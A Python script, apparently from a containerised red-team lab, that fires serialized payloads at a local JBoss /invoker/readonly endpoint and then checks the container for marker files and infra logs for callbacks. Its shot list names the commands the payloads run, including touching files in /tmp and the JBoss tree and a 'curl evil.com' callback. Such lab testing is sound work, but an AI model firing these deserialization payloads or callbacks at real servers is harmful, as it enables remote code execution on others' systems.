# -*- coding: utf-8 -*-
"""RT-4 JBoss firing + read-only truth check."""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

from common import session  # noqa: E402

SHOTS = [
    ("RV (re-verify R0 block)", "out/rt4_rv.ser", "touch /tmp/pwn_rt4_jboss_rv"),
    ("A1 hsperfdata write", "out/rt4_a1.ser", "touch /tmp/hsperfdata_root/pwn_rt4_jboss_a1"),
    ("B2 curl callback", "out/rt4_b2.ser", "curl evil.com /rt/rt4_jboss_b2"),
    ("T3 app-tree write", "out/rt4_t3.ser", "touch /jboss-6.1.0.Final/pwn_rt4_jboss_t3"),
]

s = session()
for label, rel, desc in SHOTS:
    data = open(os.path.join(HERE, rel), "rb").read()
    r = s.post("http://127.0.0.1:18080/invoker/readonly", data=data,
               headers={"Host": "evil.com", "Content-Type": "application/x-www-form-urlencoded"},
               timeout=30)
    print("[*] %-24s HTTP %s (%dB)" % (label, r.status_code, len(r.content)))

print("\n=== truth: /tmp ===")
subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time",
                "/tmp", "/tmp/hsperfdata_root"], capture_output=True, text=True)
r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time",
                    "/tmp", "/tmp/hsperfdata_root"], capture_output=True, text=True)
print(r.stdout)
print("=== truth: /jboss-6.1.0.Final marker ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time",
                    "/jboss-6.1.0.Final/pwn_rt4_jboss_t3"], capture_output=True, text=True)
print(r.stdout + r.stderr)
print("=== infra log (rt4) ===")
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "10m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4" in line:
        print("[infra] " + line)
